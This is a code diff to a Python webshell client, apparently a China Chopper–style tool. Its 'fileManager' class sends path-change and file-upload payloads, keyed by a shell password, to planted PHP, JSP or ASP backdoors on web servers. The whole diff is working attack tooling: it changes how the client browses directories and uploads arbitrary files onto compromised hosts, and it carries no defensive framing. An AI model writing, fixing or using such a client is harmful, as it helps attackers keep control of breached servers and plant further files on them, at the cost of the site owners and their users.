@@ -63,7 +63,7 @@ class fileManager:
             line='\\'
         while j!=self.i:
             j = j + 1
-            str = str + self.CHANGE_PATH[j]+ line 
+            str = str + line + self.CHANGE_PATH[j]
         if self.con.getTyp()=="php":
             changePach_ = fileC.PHP_CHDIR.replace('##',str,1)
         if self.con.getTyp()=="jsp":
@@ -74,7 +74,7 @@ class fileManager:
 
     def FileMain(self,re):
         self.i = 0
-        self.CHANGE_PATH = dict.fromkeys(range(1024),'')
+        self.CHANGE_PATH = dict.fromkeys(range(1024),'.')
         while True:
             self.PATH = self.path(re)+" >"
             # print(PATH)
@@ -96,7 +96,7 @@ class fileManager:
                             date = { self.key : CD }
                             commit = re.post(self.connect,date)
                         if self.con.getTyp()=="jsp":
-                            pass
+                             self.CHANGE_PATH[self.i] = flag[1]+'\\'
                         if self.con.getTyp()=="asp":
                             pass
                         
@@ -321,10 +321,14 @@ class fileManager:
                     strofupdate = file1.read()
                     print("upload....")
                     if self.con.getTyp()=="php":
-                        update = fileC.PHP_UPLOAD.replace('#1',flag[1],1)
-                        update = update.replace('#2',strofupdate,1)
-                        update = update.replace('@@',self.changePath(),1)
-                        date = { self.key : update }
+                        # update = fileC.PHP_UPLOAD.replace('#1',flag[1],1)
+                        # update = update.replace('#2',strofupdate,1)
+                        # update = update.replace('@@',self.changePath(),1)
+                        # date = { self.key : update}
+                        uploadDate = strofupdate
+                        #date = { 'uploadDate':uploadDate,self.key : update}
+                        update = fileC.PHP_UPLOAD
+                        date = { self.key : update,'z1':flag[1],'z2':uploadDate}
                     if self.con.getTyp()=="jsp":
                         update = fileC.JSP_UPLOAD
                         date = { self.key : "file",'cpath':self.changePath(),'ds':update,'c1':flag[1],'c2':strofupdate }
